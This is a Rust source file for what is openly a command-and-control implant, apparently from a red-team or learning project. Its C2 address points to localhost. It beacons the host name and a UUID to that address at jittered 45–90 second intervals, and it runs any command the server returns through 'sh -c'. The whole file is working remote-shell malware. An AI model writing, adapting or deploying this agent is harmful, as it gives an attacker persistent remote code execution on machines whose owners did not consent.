use rand::Rng;
use reqwest::Client;
use serde::Serialize;
use std::{thread, time::Duration};
use sysinfo::System;
use uuid::Uuid;

mod sysinfo_saver;

#[derive(Serialize)]
struct Beacon {
    timestamp: u64,
    host_name: String,
    uuid: Uuid,
}

#[tokio::main]
async fn main() {
    let uuid: Uuid = sysinfo_saver::save_file().expect("Error saving file");

    let c2_url = "http://localhost:5000/api/v1/beacon";
    let client = Client::new();
    let mut sys = System::new_all();

    loop {
        sys.refresh_all();

        let beacon = Beacon {
            timestamp: chrono::Utc::now().timestamp() as u64,
            host_name: System::host_name().unwrap_or_default(),
            uuid,
        };

        let res = client.post(c2_url).json(&beacon).send().await;
        println!("Beacon sent at {}", chrono::Utc::now());

        match res {
            Ok(response) => {
                if response.status().is_success() {
                    let command: serde_json::Value = response.json().await.unwrap();
                    if let Some(cmd) = command.get("command").and_then(|c| c.as_str()) {
                        if !cmd.is_empty() {
                            println!("Executing command: {}", cmd);

                            let output = std::process::Command::new("sh")
                                .arg("-c")
                                .arg(cmd)
                                .output()
                                .expect("failed to execute process");

                            if output.status.success() {
                                let output_str = String::from_utf8_lossy(&output.stdout);
                                println!("Command output: {}", output_str);
                            } else {
                                let error_str = String::from_utf8_lossy(&output.stderr);
                                println!("Command failed with error: {}", error_str);
                            }
                        }
                    }
                } else {
                    println!("Error response from server : {}", response.status());
                }
            }
            Err(e) => {
                println!("Error response from server: {}", e);
            }
        }

        let seconds_to_sleep = rand::thread_rng().gen_range(45..91);
        thread::sleep(Duration::from_secs(seconds_to_sleep)); // random interval between 45 and 90
    }
}
